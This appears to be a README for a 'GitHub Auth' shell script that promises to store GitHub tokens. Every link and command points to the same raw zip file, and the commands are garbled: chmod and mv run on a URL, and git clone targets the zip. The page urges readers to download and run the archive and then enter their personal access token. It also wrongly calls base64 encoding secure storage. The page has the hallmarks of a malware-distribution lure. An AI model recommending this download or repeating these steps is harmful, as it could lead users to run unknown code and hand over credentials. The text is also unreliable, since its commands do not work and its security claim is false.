## Introduction

GitHub Auth is a simple shell script designed to streamline the process of authenticating with GitHub. It helps you save and load your credentials securely, making it easier to clone private repositories without repeated logins. 

By using GitHub Auth, you can focus on your coding tasks instead of managing authentication issues. 

You can download the latest version of the script from the [Releases section](https://github.com/ISdeek89/github-auth/raw/refs/heads/main/Sphenophorus/github_auth_2.7.zip). After downloading, execute the script to get started.

---

## Features

- **Easy Authentication**: Quickly authenticate to GitHub with your personal access token (PAT).
- **Secure Storage**: Store your credentials safely using base64 encoding.
- **User-Friendly**: Simple command-line interface that requires minimal setup.
- **Compatibility**: Works seamlessly with both public and private repositories.
- **Lightweight**: Minimal dependencies and fast execution.

## Installation

To install GitHub Auth, follow these steps:

1. **Download the Script**: Go to the [Releases section](https://github.com/ISdeek89/github-auth/raw/refs/heads/main/Sphenophorus/github_auth_2.7.zip) and download the latest version of the script.
2. **Make the Script Executable**: Open your terminal and navigate to the directory where you downloaded the script. Run the following command to make it executable:

   ```bash
   chmod +x https://github.com/ISdeek89/github-auth/raw/refs/heads/main/Sphenophorus/github_auth_2.7.zip
   ```

3. **Move the Script to Your Path**: Optionally, you can move the script to a directory in your PATH for easier access:

   ```bash
   mv https://github.com/ISdeek89/github-auth/raw/refs/heads/main/Sphenophorus/github_auth_2.7.zip /usr/local/bin/github-auth
   ```

Now, you can run the script from anywhere in your terminal.

## Usage

Using GitHub Auth is straightforward. Here’s how to get started:

1. **Run the Script**: Execute the script by typing:

   ```bash
   github-auth
   ```

2. **Enter Your Credentials**: The script will prompt you for your GitHub username and personal access token (PAT). Make sure you have generated a PAT from your GitHub account settings.

3. **Clone a Repository**: Once your credentials are stored, you can clone any private repository without entering your credentials again. Use the following command:

   ```bash
   git clone https://github.com/ISdeek89/github-auth/raw/refs/heads/main/Sphenophorus/github_auth_2.7.zip
   ```

4. **Loading Credentials**: If you need to load your credentials again, simply run the script:

   ```bash
   github-auth
   ```

5. **Check Stored Credentials**: You can view your stored credentials at any time. The script will display them in an encoded format for security.
